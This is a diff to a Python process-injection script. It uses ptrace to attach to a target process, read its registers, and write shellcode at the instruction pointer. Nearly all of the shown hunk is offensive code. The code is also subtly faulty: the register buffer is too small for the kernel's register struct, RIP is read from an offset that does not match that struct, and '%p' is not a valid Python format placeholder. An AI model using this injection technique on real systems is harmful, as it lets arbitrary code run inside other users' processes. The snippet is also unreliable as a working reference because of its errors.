@@ -43,12 +43,13 @@ def main():
 
     print("+ Getting Registers")
     regs = struct.pack("=QQQQQQQQ", 0, 0, 0, 0, 0, 0, 0, 0)
-    ret = libc.ptrace(12, target_pid, None, ctypes.c_void_p(regs))  # PTRACE_GETREGS
+    regs_buffer = ctypes.create_string_buffer(regs)
+    ret = libc.ptrace(12, target_pid, None, ctypes.cast(regs_buffer, ctypes.c_void_p))  # PTRACE_GETREGS
     if ret < 0:
         print("ptrace(GETREGS) error")
         sys.exit(1)
 
-    rip_address = struct.unpack("=Q", regs[8:])[0]
+    rip_address = struct.unpack("=Q", regs_buffer[8:])[0]
 
     print("+ Injecting shell code at %p" % rip_address)
     inject_data(target_pid, shellcode, rip_address, SHELLCODE_SIZE)
